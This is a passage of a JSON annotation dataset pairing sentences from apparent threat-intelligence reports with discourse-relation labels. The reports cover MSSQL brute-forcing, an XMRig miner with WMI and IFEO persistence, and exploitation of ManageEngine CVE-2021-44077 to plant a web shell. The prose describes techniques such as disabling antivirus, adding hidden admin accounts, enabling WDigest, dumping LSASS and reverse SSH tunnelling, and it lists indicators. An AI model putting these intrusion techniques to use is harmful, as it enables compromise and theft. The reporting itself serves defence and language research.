        "S2": "Again, those are quick wins to add to your detection capabilities to detect the usage of unauthorized remote administration tools, commonly used by ransomware operators",
        "relation": "ELABORATION"
    },
    {
        "S1": "Again, those are quick wins to add to your detection capabilities to detect the usage of unauthorized remote administration tools, commonly used by ransomware operators",
        "S2": "AnyDesk configuration file and the network logs revealed that the id used was 159889039 and the source IP was 108.177.235.25 (LeaseWeb USA \u2013 Cloud Provider).",
        "relation": "MISC"
    },
    {
        "S1": "AnyDesk configuration file and the network logs revealed that the id used was 159889039 and the source IP was 108.177.235.25 (LeaseWeb USA \u2013 Cloud Provider).",
        "S2": "There was no impact (exfiltration, data encryption, or destruction) during this intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "There was no impact (exfiltration, data encryption, or destruction) during this intrusion.",
        "S2": "However, the observed TTPs show common cybercrime threat actors tradecraft which may have lead to domain wide ransomware had the threat actors had enough time.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Over the month of March, we observed a cluster of activity targeting MSSQL servers.",
        "S2": "The activity started via password brute force attempts for the MSSQL SA account.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The activity started via password brute force attempts for the MSSQL SA account.",
        "S2": "These brute force attempts were observed repeatedly over the month.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These brute force attempts were observed repeatedly over the month.",
        "S2": "Examples included one cluster of 24,000 failed attempts from the same source, over a 27 hour effort, before they finally managed to guess the password.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Examples included one cluster of 24,000 failed attempts from the same source, over a 27 hour effort, before they finally managed to guess the password.",
        "S2": "After having the correct credentials in their possession, the attackers then spawned a command shell via xp_cmdshell.",
        "relation": "NEXT"
    },
    {
        "S1": "After having the correct credentials in their possession, the attackers then spawned a command shell via xp_cmdshell.",
        "S2": "According to Microsoft documentation, xp_cmdshell spawns a Windows command shell and passes in a string for execution.",
        "relation": "ELABORATION"
    },
    {
        "S1": "According to Microsoft documentation, xp_cmdshell spawns a Windows command shell and passes in a string for execution.",
        "S2": "Using xp_cmdshell, the threat actors were able to execute any command against the compromised server.",
        "relation": "NEXT"
    },
    {
        "S1": "Using xp_cmdshell, the threat actors were able to execute any command against the compromised server.",
        "S2": "They attempted to kill a bunch of AV programs by using taskkill.exe.",
        "relation": "MISC"
    },
    {
        "S1": "They attempted to kill a bunch of AV programs by using taskkill.exe.",
        "S2": "The threat actors then wrote multiple commands to a batch file by using echo and redirecting the strings to a file named 1.bat.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors then wrote multiple commands to a batch file by using echo and redirecting the strings to a file named 1.bat.",
        "S2": "After the batch file was written they then proceeded to perform the same action echoing data into a file named bigfile.txt.",
        "relation": "NEXT"
    },
    {
        "S1": "After the batch file was written they then proceeded to perform the same action echoing data into a file named bigfile.txt.",
        "S2": "After they finished writing to that file, they ran certutil to decode the base64 data into an executable file.",
        "relation": "NEXT"
    },
    {
        "S1": "After they finished writing to that file, they ran certutil to decode the base64 data into an executable file.",
        "S2": "This executable was a privilege escalation tool that was used to execute the batch file to make sure it executed with high enough permissions.",
        "relation": "NEXT"
    },
    {
        "S1": "This executable was a privilege escalation tool that was used to execute the batch file to make sure it executed with high enough permissions.",
        "S2": "They then executed the batch script.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They then executed the batch script.",
        "S2": "The commands included adding new users to the local administrators group, enabling RDP, enabling WDigest, and hiding the newly created admin accounts using the registry.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The commands included adding new users to the local administrators group, enabling RDP, enabling WDigest, and hiding the newly created admin accounts using the registry.",
        "S2": "Once the threat actors had established persistence on the compromised host, they moved to their final objective, which was to install and run the XMRig miner.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the threat actors had established persistence on the compromised host, they moved to their final objective, which was to install and run the XMRig miner.",
        "S2": "They dropped a Binary Managed Object Format (BMOF) file along with the miner itself, to do that.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They dropped a Binary Managed Object Format (BMOF) file along with the miner itself, to do that.",
        "S2": "The threat actors used mofcomp.exe to decompile the BMOF binary and register a malicious class in the WMI repository.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors used mofcomp.exe to decompile the BMOF binary and register a malicious class in the WMI repository.",
        "S2": "The event consumer of the newly created classes included a VBE script responsible for setting up and executing the XMRig miner with the correct settings.",
        "relation": "NEXT"
    },
    {
        "S1": "The event consumer of the newly created classes included a VBE script responsible for setting up and executing the XMRig miner with the correct settings.",
        "S2": "No other activity beyond the mining was observed before the threat actors were evicted.",
        "relation": "ELABORATION"
    },
    {
        "S1": "No other activity beyond the mining was observed before the threat actors were evicted.",
        "S2": "The initial access took place via a brute-force attack, where the threat actors mainly targeted the System Admin (SA) account.",
        "relation": "MISC"
    },
    {
        "S1": "The initial access took place via a brute-force attack, where the threat actors mainly targeted the System Admin (SA) account.",
        "S2": "During the intrusions, we could see SQL Server event ID 18456 Failure Audit Events in the Windows application logs.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During the intrusions, we could see SQL Server event ID 18456 Failure Audit Events in the Windows application logs.",
        "S2": "We witnessed more than 24,000 attempts from the same source before the threat actors successfully guessed the username and password for the open SQL database.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We witnessed more than 24,000 attempts from the same source before the threat actors successfully guessed the username and password for the open SQL database.",
        "S2": "Example of the failed brute force attempts:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Example of the failed brute force attempts:",
        "S2": "Followed by eventual successful logins.",
        "relation": "NEXT"
    },
    {
        "S1": "Followed by eventual successful logins.",
        "S2": "It it likely that multiple successful logins were observed due to the automated access script that the threat actor was using.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It it likely that multiple successful logins were observed due to the automated access script that the threat actor was using.",
        "S2": "In the next attack stage, the threat actors established a cmd shell via Extended SQL Stored Procedure (xp_cmdshell).",
        "relation": "NEXT"
    },
    {
        "S1": "In the next attack stage, the threat actors established a cmd shell via Extended SQL Stored Procedure (xp_cmdshell).",
        "S2": "This process allows you to issue operating system commands directly to the Windows command shell using T-SQL code.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This process allows you to issue operating system commands directly to the Windows command shell using T-SQL code.",
        "S2": "An example of command execution following a successful authentication to SQL database using xp_cmdshell:",
        "relation": "NEXT"
    },
    {
        "S1": "An example of command execution following a successful authentication to SQL database using xp_cmdshell:",
        "S2": "At a high level, the overall execution events can be depicted in the below diagram:",
        "relation": "ELABORATION"
    },
    {
        "S1": "At a high level, the overall execution events can be depicted in the below diagram:",
        "S2": "If we look into the Windows Application logs, specifically, the SQL Server event ID 15457, captures this as an \u2018xp_cmdshell\u2019 event.",
        "relation": "ELABORATION"
    },
    {
        "S1": "If we look into the Windows Application logs, specifically, the SQL Server event ID 15457, captures this as an \u2018xp_cmdshell\u2019 event.",
        "S2": "Additionally, the SQL Server audit collection also captures similar events.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Additionally, the SQL Server audit collection also captures similar events.",
        "S2": "The first commands executed by the threat actors included using taskkill for various anti-virus software.",
        "relation": "MISC"
    },
    {
        "S1": "The first commands executed by the threat actors included using taskkill for various anti-virus software.",
        "S2": "The threat actors also favored the execution of batch scripts on the compromised host.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors also favored the execution of batch scripts on the compromised host.",
        "S2": "They used xp_cmdshell to write a batch script (1.bat) to disk by redirecting strings to the file using echo commands.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They used xp_cmdshell to write a batch script (1.bat) to disk by redirecting strings to the file using echo commands.",
        "S2": "A second set of commands were also echoed into a file named bigfile.txt.",
        "relation": "NEXT"
    },
    {
        "S1": "A second set of commands were also echoed into a file named bigfile.txt.",
        "S2": "Once complete, certutil was used to decode the text and create an executable file.",
        "relation": "NEXT"
    },
    {
        "S1": "Once complete, certutil was used to decode the text and create an executable file.",
        "S2": "This executable was then used in executing the 1.bat batch file.",
        "relation": "NEXT"
    },
    {
        "S1": "This executable was then used in executing the 1.bat batch file.",
        "S2": "Pulling the hash of the file that was written, matches what appears to be a privilege escalation tool as seen in the hits from THOR scanner: https://www.virustotal.com/gui/file/b67dfd4a818d10a017a4d32386cf4cd2a3974636bed04f27e45de6ada86a56d2/community",
        "relation": "ELABORATION"
    },
    {
        "S1": "Pulling the hash of the file that was written, matches what appears to be a privilege escalation tool as seen in the hits from THOR scanner: https://www.virustotal.com/gui/file/b67dfd4a818d10a017a4d32386cf4cd2a3974636bed04f27e45de6ada86a56d2/community",
        "S2": "We believe this tool may be a variation of NetworkServiceExploit.exe, which attempts to use NetworkService for privilege escalation.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We believe this tool may be a variation of NetworkServiceExploit.exe, which attempts to use NetworkService for privilege escalation.",
        "S2": "Additionally, we noticed the attackers dropping a file named \u201cxitmf\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "Additionally, we noticed the attackers dropping a file named \u201cxitmf\u201d.",
        "S2": "Looking into the file\u2019s content, we noticed that the header began with \u201cFOMB\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Looking into the file\u2019s content, we noticed that the header began with \u201cFOMB\u201d.",
        "S2": "When flipping the header, it spells BMOF, which indicates a Binary Managed Object Format file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When flipping the header, it spells BMOF, which indicates a Binary Managed Object Format file.",
        "S2": "BMOF is a compiled version of a Managed Object Format (MOF) file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "BMOF is a compiled version of a Managed Object Format (MOF) file.",
        "S2": "As per Microsoft\u2019s official documentation:",
        "relation": "ELABORATION"
    },
    {
        "S1": "As per Microsoft\u2019s official documentation:",
        "S2": "\u201cManaged Object Format (MOF) is the language used to describe Common Information Model (CIM) classes.\u201d",
        "relation": "ELABORATION"
    },
    {
        "S1": "\u201cManaged Object Format (MOF) is the language used to describe Common Information Model (CIM) classes.\u201d",
        "S2": "MOF files are compiled using the Windows compiler tool mofcomp.",
        "relation": "ELABORATION"
    },
    {
        "S1": "MOF files are compiled using the Windows compiler tool mofcomp.",
        "S2": "Mofcomp.exe is also used to execute scripts by parsing the MOF statements and creates new classes as part of the WMI repository.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Mofcomp.exe is also used to execute scripts by parsing the MOF statements and creates new classes as part of the WMI repository.",
        "S2": "Using the same mofcomp utility, its possible to decompile the BMOF to extract the script, using this command provided by Matt Graeber:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Using the same mofcomp utility, its possible to decompile the BMOF to extract the script, using this command provided by Matt Graeber:",
        "S2": "Threat actors also transferred a Visual Basic Encoded (VBE) file that is executed on the host using cscript.exe.",
        "relation": "MISC"
    },
    {
        "S1": "Threat actors also transferred a Visual Basic Encoded (VBE) file that is executed on the host using cscript.exe.",
        "S2": "Once run, the script would set up and execute the XMRig CoinMiner.",
        "relation": "NEXT"
    },
    {
        "S1": "Once run, the script would set up and execute the XMRig CoinMiner.",
        "S2": "During the execution, the password 579562847 is provided as an argument.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During the execution, the password 579562847 is provided as an argument.",
        "S2": "We recognize that this is a VBE file from the file signature (\u201cmagic bytes\u201d) at the first four bytes of the top of the file.",
        "relation": "MISC"
    },
    {
        "S1": "We recognize that this is a VBE file from the file signature (\u201cmagic bytes\u201d) at the first four bytes of the top of the file.",
        "S2": "We can decode the VBE file using CyberChef:",
        "relation": "ELABORATION"
    },
    {
        "S1": "We can decode the VBE file using CyberChef:",
        "S2": "The script has several functions, one to control the coin miner software on the host, and two, to configure the parameters such as user-agent strings through randomization:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The script has several functions, one to control the coin miner software on the host, and two, to configure the parameters such as user-agent strings through randomization:",
        "S2": "Command interactions are done via WMI, for process discovery:",
        "relation": "MISC"
    },
    {
        "S1": "Command interactions are done via WMI, for process discovery:",
        "S2": "In the code, we observed further attempts to obfuscate sensitive attributable values:",
        "relation": "MISC"
    },
    {
        "S1": "In the code, we observed further attempts to obfuscate sensitive attributable values:",
        "S2": "Using the original password and some further de-obfuscation, we could decipher the values, in this case, the email address is:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Using the original password and some further de-obfuscation, we could decipher the values, in this case, the email address is:",
        "S2": "[email protected]",
        "relation": "ELABORATION"
    },
    {
        "S1": "[email protected]",
        "S2": "Some other deciphered values relate to coin mining pools:",
        "relation": "MISC"
    },
    {
        "S1": "Some other deciphered values relate to coin mining pools:",
        "S2": "We also observed another dropper.",
        "relation": "MISC"
    },
    {
        "S1": "We also observed another dropper.",
        "S2": "Threat actors transferred the file ex.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Threat actors transferred the file ex.exe.",
        "S2": "Ex.exe is an Unrar application that they used to extract more malicious artifacts:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Ex.exe is an Unrar application that they used to extract more malicious artifacts:",
        "S2": "The kit.bat script included instructions for executing the miner as well as for creating persistence via a schedule task.",
        "relation": "MISC"
    },
    {
        "S1": "The kit.bat script included instructions for executing the miner as well as for creating persistence via a schedule task.",
        "S2": "See the contents of the script below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "See the contents of the script below:",
        "S2": "Something to note here, regarding the kit.bat script, is that we discovered that its contents were the topic of discussion in a Chinese forum back in 2018.",
        "relation": "MISC"
    },
    {
        "S1": "Something to note here, regarding the kit.bat script, is that we discovered that its contents were the topic of discussion in a Chinese forum back in 2018.",
        "S2": "The threat actors wrote a batch script (1.bat) that contained commands for establishing persistence on the compromised host.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors wrote a batch script (1.bat) that contained commands for establishing persistence on the compromised host.",
        "S2": "We see the creation of a new account and adding this account to the local administrators group.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We see the creation of a new account and adding this account to the local administrators group.",
        "S2": "They also made remote RDP connections possible by changing the fDenyTSConnections and UserAuthentication values to 0.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They also made remote RDP connections possible by changing the fDenyTSConnections and UserAuthentication values to 0.",
        "S2": "We later see the threat actors writing another batch file to disk and executing it.",
        "relation": "NEXT"
    },
    {
        "S1": "We later see the threat actors writing another batch file to disk and executing it.",
        "S2": "The kit.bat script contained a scheduled task that would run the kit.bat script on an hourly basis.",
        "relation": "MISC"
    },
    {
        "S1": "The kit.bat script contained a scheduled task that would run the kit.bat script on an hourly basis.",
        "S2": "As explained in the execution tactic above, the threat actors installed a malicious WMI event subscription by including a VBScript that would execute on the compromised host.",
        "relation": "MISC"
    },
    {
        "S1": "As explained in the execution tactic above, the threat actors installed a malicious WMI event subscription by including a VBScript that would execute on the compromised host.",
        "S2": "This was used as a method of persistence.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This was used as a method of persistence.",
        "S2": "The VBScript would execute every day at 23:00 of the host local time.",
        "relation": "MISC"
    },
    {
        "S1": "The VBScript would execute every day at 23:00 of the host local time.",
        "S2": "Decompiled .mof file containing the WMI event subscription.",
        "relation": "MISC"
    },
    {
        "S1": "Decompiled .mof file containing the WMI event subscription.",
        "S2": "Breaking down the above screenshot, the WMI event subscription contains the below malicious EventConsumer and EventFilter classes:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Breaking down the above screenshot, the WMI event subscription contains the below malicious EventConsumer and EventFilter classes:",
        "S2": "Looking into the VBScript, we notice that it is reaching out to the domain mymst007[.]info on port 4000 to download one more file and save it as temp file.",
        "relation": "MISC"
    },
    {
        "S1": "Looking into the VBScript, we notice that it is reaching out to the domain mymst007[.]info on port 4000 to download one more file and save it as temp file.",
        "S2": "We used the below python code to emulate the VBScript and download the next stage payload:",
        "relation": "ELABORATION"
    },
    {
        "S1": "We used the below python code to emulate the VBScript and download the next stage payload:",
        "S2": "The final method of persistence we observed was the addition of an entry into the Image File Execution Option (IFEO) registry key.",
        "relation": "MISC"
    },
    {
        "S1": "The final method of persistence we observed was the addition of an entry into the Image File Execution Option (IFEO) registry key.",
        "S2": "By changing the Debugger value to a different executable, an attacker used IFEO to launch a program other than the intended one.",
        "relation": "NEXT"
    },
    {
        "S1": "By changing the Debugger value to a different executable, an attacker used IFEO to launch a program other than the intended one.",
        "S2": "In this case, threat actors modified the below registry key to launch the miner executable (smss.exe) instead of the svchost.exe binary.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this case, threat actors modified the below registry key to launch the miner executable (smss.exe) instead of the svchost.exe binary.",
        "S2": "The threat actors dropped a file named bigfile.txt which they used certutil to convert to bigfile.exe which we believe is a variation of NetworkServiceExploit.exe as seen below.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors dropped a file named bigfile.txt which they used certutil to convert to bigfile.exe which we believe is a variation of NetworkServiceExploit.exe as seen below.",
        "S2": "This was used in this intrusion to run the batch file with the following command:",
        "relation": "NEXT"
    },
    {
        "S1": "This was used in this intrusion to run the batch file with the following command:",
        "S2": "The threat actors attempted to kill antivirus tasks that could be running on the host.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors attempted to kill antivirus tasks that could be running on the host.",
        "S2": "The commands targeted the below processes:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The commands targeted the below processes:",
        "S2": "The privilege escalation tool the threat actors brought with them was written as a text file and then decoded using certutil into a binary file.",
        "relation": "MISC"
    },
    {
        "S1": "The privilege escalation tool the threat actors brought with them was written as a text file and then decoded using certutil into a binary file.",
        "S2": "As we can see from the contents of the 1.bat script, the threat actors are adding a new local administrator user and they proceed with hiding the user account by adding it to the registry using \u201cSpecial Accounts\u201c.",
        "relation": "MISC"
    },
    {
        "S1": "As we can see from the contents of the 1.bat script, the threat actors are adding a new local administrator user and they proceed with hiding the user account by adding it to the registry using \u201cSpecial Accounts\u201c.",
        "S2": "Through the execution of the initial batch script, 1.bat, they also disabled the User Access Control(UAC) remote restriction by setting the registry key value to \u201c1\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Through the execution of the initial batch script, 1.bat, they also disabled the User Access Control(UAC) remote restriction by setting the registry key value to \u201c1\u201d.",
        "S2": "Threat actors also enabled Wdigest.",
        "relation": "MISC"
    },
    {
        "S1": "Threat actors also enabled Wdigest.",
        "S2": "After many files were added to the system the threat actors included commands to remove them once their execution was finished.",
        "relation": "NEXT"
    },
    {
        "S1": "After many files were added to the system the threat actors included commands to remove them once their execution was finished.",
        "S2": "During the initial access credentials were obtained via a brute-force attack against the exposed MSSQL server.",
        "relation": "MISC"
    },
    {
        "S1": "During the initial access credentials were obtained via a brute-force attack against the exposed MSSQL server.",
        "S2": "No other credential access was observed during this intrusion, although the threat actors did enable WDigest to make later credential access easier.",
        "relation": "MISC"
    },
    {
        "S1": "No other credential access was observed during this intrusion, although the threat actors did enable WDigest to make later credential access easier.",
        "S2": "We observed that the domain mymst007[.]info is used to download further payloads.",
        "relation": "MISC"
    },
    {
        "S1": "We observed that the domain mymst007[.]info is used to download further payloads.",
        "S2": "The domain was created five years ago.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The domain was created five years ago.",
        "S2": "We have seen similar reports that make mention of the same infrastructure.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We have seen similar reports that make mention of the same infrastructure.",
        "S2": "Attacks associated with this domain include the same or similar tactics techniques and procedures (TTPs).",
        "relation": "ELABORATION"
    },
    {
        "S1": "Attacks associated with this domain include the same or similar tactics techniques and procedures (TTPs).",
        "S2": "Connections related to the domain \u2013 mymst007[.]info",
        "relation": "ELABORATION"
    },
    {
        "S1": "Connections related to the domain \u2013 mymst007[.]info",
        "S2": "The impact was concentrated on this one host.",
        "relation": "MISC"
    },
    {
        "S1": "The impact was concentrated on this one host.",
        "S2": "We did not see any further activity in this case.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We did not see any further activity in this case.",
        "S2": "The compromised host had XMRig miner installed and running.",
        "relation": "MISC"
    },
    {
        "S1": "The compromised host had XMRig miner installed and running.",
        "S2": "The miner was also connecting to cryptomining pool such as minergate[.]com.",
        "relation": "NEXT"
    },
    {
        "S1": "The intrusion began with the exploitation of an internet-facing instance of ManageEngine SupportCenter Plus via the CVE-2021-44077 vulnerability.",
        "S2": "The threat actor successfully exploited the RCE vulnerability in SupportCenter Plus, which allowed them to drop a web shell in an internet accessible directory.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor successfully exploited the RCE vulnerability in SupportCenter Plus, which allowed them to drop a web shell in an internet accessible directory.",
        "S2": "The exploit we witnessed looks very similar to a publicly available POC exploit on GitHub.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The exploit we witnessed looks very similar to a publicly available POC exploit on GitHub.",
        "S2": "The threat actor then performed some generic enumeration of the system and enabled WDigest authentication on the server using the web shell.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor then performed some generic enumeration of the system and enabled WDigest authentication on the server using the web shell.",
        "S2": "Enumeration on the system included querying network configuration, a list of domain joined computers, user and OS information, and current user sessions on the beachhead.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Enumeration on the system included querying network configuration, a list of domain joined computers, user and OS information, and current user sessions on the beachhead.",
        "S2": "Periodically over several days, the threat actor returned and checked what users were logged into the beachhead server using the webshell.",
        "relation": "NEXT"
    },
    {
        "S1": "Periodically over several days, the threat actor returned and checked what users were logged into the beachhead server using the webshell.",
        "S2": "Finally, on the seventh day, the threat actors performed an LSASS dump on the system, which captured the credentials of an administrative user that had recently logged into the system.",
        "relation": "NEXT"
    },
    {
        "S1": "Finally, on the seventh day, the threat actors performed an LSASS dump on the system, which captured the credentials of an administrative user that had recently logged into the system.",
        "S2": "In this case, the threat actor had access to the user\u2019s plaintext credentials as a result of WDigest authentication being previously enabled.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this case, the threat actor had access to the user\u2019s plaintext credentials as a result of WDigest authentication being previously enabled.",
        "S2": "The following day the threat actor downloaded ekern.exe, which was a renamed version of Plink, and deployed a script to establish a reverse SSH connection to the RDP port of the beachhead server.",
        "relation": "NEXT"
    },
    {
        "S1": "The following day the threat actor downloaded ekern.exe, which was a renamed version of Plink, and deployed a script to establish a reverse SSH connection to the RDP port of the beachhead server.",
        "S2": "An interactive RDP session was successfully established to the beachhead server by the threat actor where they began enumerating other computers on the network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "An interactive RDP session was successfully established to the beachhead server by the threat actor where they began enumerating other computers on the network.",
        "S2": "From the beachhead, lateral movement was conducted to three other servers via RDP, including a domain controller, a file server, and another server.",
        "relation": "NEXT"
    },
    {
        "S1": "From the beachhead, lateral movement was conducted to three other servers via RDP, including a domain controller, a file server, and another server.",
        "S2": "Confidential files were exfiltrated from the network throughout this intrusion using a mixture of web shell access and hands-on keyboard access via RDP.",
        "relation": "NEXT"
    },
    {
        "S1": "Confidential files were exfiltrated from the network throughout this intrusion using a mixture of web shell access and hands-on keyboard access via RDP.",
        "S2": "These files, were critical to the business and it\u2019s partner.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These files, were critical to the business and it\u2019s partner.",
        "S2": "The documents were selectively chosen as if the attackers were looking for specific material.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The documents were selectively chosen as if the attackers were looking for specific material.",
        "S2": "When it came time to exfiltrate certain files or folders, one folder of the utmost importance was exfiltrated while passing on other partner folders and files.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When it came time to exfiltrate certain files or folders, one folder of the utmost importance was exfiltrated while passing on other partner folders and files.",
        "S2": "Besides the files and folders mentioned, internal machine certs were reviewed and later exfiltrated.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Besides the files and folders mentioned, internal machine certs were reviewed and later exfiltrated.",
        "S2": "The exfiltrated information has not been found in any public dumps or sales to date.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The exfiltrated information has not been found in any public dumps or sales to date.",
        "S2": "The threat actors were evicted from the network soon after stealing this information.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors were evicted from the network soon after stealing this information.",
        "S2": "Initial access began with the exploitation of ManageEngine SupportCenter Plus via CVE-2021-44077, an unauthenticated remote code execution vulnerability.",
        "relation": "MISC"
    },
    {
        "S1": "Initial access began with the exploitation of ManageEngine SupportCenter Plus via CVE-2021-44077, an unauthenticated remote code execution vulnerability.",
        "S2": "There are two main HTTP requests responsible for this exploit.",
        "relation": "ELABORATION"
    },
    {
        "S1": "There are two main HTTP requests responsible for this exploit.",
        "S2": "The first request sent a POST containing the contents of a PE file which was written to:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first request sent a POST containing the contents of a PE file which was written to:",
        "S2": "The second request, attempted to install Zoho\u2019s Site24x7 performance monitoring tool but indirectly invoked the uploaded msiexec.exe file.",
        "relation": "LIST"
    },
    {
        "S1": "The second request, attempted to install Zoho\u2019s Site24x7 performance monitoring tool but indirectly invoked the uploaded msiexec.exe file.",
        "S2": "More details regarding this are covered in the Execution section.",
        "relation": "MISC"
    },
    {
        "S1": "More details regarding this are covered in the Execution section.",
        "S2": "The exploitation attempts against the internet-facing server arrived from two Tor exit nodes.",
        "relation": "MISC"
    },
    {
        "S1": "The exploitation attempts against the internet-facing server arrived from two Tor exit nodes.",
        "S2": "Each step of the exploit was observed originating from a different TOR exit node.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Each step of the exploit was observed originating from a different TOR exit node.",
        "S2": "The second stage of the CVE-2021-44077 exploit involved initiating the installation of Zoho\u2019s Site24x7 performance monitoring tool.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The second stage of the CVE-2021-44077 exploit involved initiating the installation of Zoho\u2019s Site24x7 performance monitoring tool.",
        "S2": "Support Center Plus will do this by invoking the installation via msiexec.exe by running:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Support Center Plus will do this by invoking the installation via msiexec.exe by running:",
        "S2": "The running path of Support Center Plus at the time this command runs is C:\\Program Files\\ManageEngine\\SupportCenterPlus\\bin\\ which means the msiexec.exe uploaded by the threat actor will be favored rather than the legitimate Microsoft utility.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The running path of Support Center Plus at the time this command runs is C:\\Program Files\\ManageEngine\\SupportCenterPlus\\bin\\ which means the msiexec.exe uploaded by the threat actor will be favored rather than the legitimate Microsoft utility.",
        "S2": "Once the malicious msiexec.exe is executed an embedded Java payload will be decoded and written to:",
        "relation": "NEXT"
    },
    {
        "S1": "Once the malicious msiexec.exe is executed an embedded Java payload will be decoded and written to:",
        "S2": "The parameters passed to msiexec.exe are never used and the Site24x7 performance monitoring tool is never installed.",
        "relation": "NEXT"
    },
    {
        "S1": "The parameters passed to msiexec.exe are never used and the Site24x7 performance monitoring tool is never installed.",
        "S2": "The web shell was written to:",
        "relation": "MISC"
    },
    {
        "S1": "The web shell was written to:",
        "S2": "This location is web accessible which means the threat actors can interact with the web shell through a web browser from the internet.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This location is web accessible which means the threat actors can interact with the web shell through a web browser from the internet.",
        "S2": "Here are a few commands run through the web shell.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Here are a few commands run through the web shell.",
        "S2": "The following diagram visually illustrates the CVE-2021-44077 exploitation and execution process.",
        "relation": "MISC"
    },
    {
        "S1": "The following diagram visually illustrates the CVE-2021-44077 exploitation and execution process.",
        "S2": "The threat actors had previously uploaded a different file, named the same thing minutes before the web shell was created.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors had previously uploaded a different file, named the same thing minutes before the web shell was created.",
        "S2": "After the execution of that file seemed to fail, the threat actors uploaded the msiexec.exe file from above which created the web shell seconds later.",
        "relation": "NEXT"
    },
    {
        "S1": "After the execution of that file seemed to fail, the threat actors uploaded the msiexec.exe file from above which created the web shell seconds later.",
        "S2": "The two msiexec files included the same web shell but had some differing characteristics.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The two msiexec files included the same web shell but had some differing characteristics.",
        "S2": "Here is some information on the first attempted msiexec file which failed.",
        "relation": "MISC"
    },
    {
        "S1": "Here is some information on the first attempted msiexec file which failed.",
        "S2": "The main difference being the interesting PDB path m:\\work\\shellll\\ and the differing .NET versions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The main difference being the interesting PDB path m:\\work\\shellll\\ and the differing .NET versions.",
        "S2": "We can see from the Catalina.txt log that when the threat actors run certain commands such as fxs.bat (RDP tunneling) the application thinks the process is hung (runs for 30+ seconds) and creates a warning message:",
        "relation": "MISC"
    },
    {
        "S1": "We can see from the Catalina.txt log that when the threat actors run certain commands such as fxs.bat (RDP tunneling) the application thinks the process is hung (runs for 30+ seconds) and creates a warning message:",
        "S2": "The web shell dropped to the beachhead during the exploitation process was the only form of persistence observed during the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The web shell dropped to the beachhead during the exploitation process was the only form of persistence observed during the intrusion.",
        "S2": "There are multiple remote interaction capabilities in the Java web shell, including:",
        "relation": "ELABORATION"
    },
    {
        "S1": "There are multiple remote interaction capabilities in the Java web shell, including:",
        "S2": "- Execution of commands",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Execution of commands",
        "S2": "- View and download files",
        "relation": "LIST"
    },
    {
        "S1": "- View and download files",
        "S2": "- Creation of new files",
        "relation": "LIST"
    },
    {
        "S1": "- Creation of new files",
        "S2": "Privilege escalation was not needed on the beachhead ManageEngine server as the exploit provided the execution of commands through the web shell SYSTEM level privileges.",
        "relation": "MISC"
    },
    {
        "S1": "Privilege escalation was not needed on the beachhead ManageEngine server as the exploit provided the execution of commands through the web shell SYSTEM level privileges.",
        "S2": "Later during the intrusion they dumped credentials for a user that had privilege\u2019s allowing lateral movement throughout the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "Later during the intrusion they dumped credentials for a user that had privilege\u2019s allowing lateral movement throughout the environment.",
        "S2": "More on the dumping method in the Credential Access section.",
        "relation": "ELABORATION"
    },
    {
